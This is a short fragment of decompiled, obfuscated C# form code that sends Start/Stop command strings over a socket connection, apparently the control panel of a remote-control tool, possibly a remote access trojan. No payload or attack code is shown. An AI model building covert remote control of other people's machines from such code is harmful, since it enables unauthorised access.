		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_6(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(Button1.Text, "Start", TextCompare: false) == 0)
			{
				Button1.Text = "Stop";
				sk.Send("!" + Class7.string_1 + Conversions.ToString(ComboBox1.SelectedIndex) + Class7.string_1 + ComboBox2.Text);
			}
			else
			{
				Button1.Text = "Start";
				sk.Send("@");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_7(object sender, EventArgs e)
	{
	}

	public void method_8(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_9(object sender, EventArgs e)
	{
		try
		{
			if (sk.CN)
			{
				sk.Send("@");
			}
			sk.CN = false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
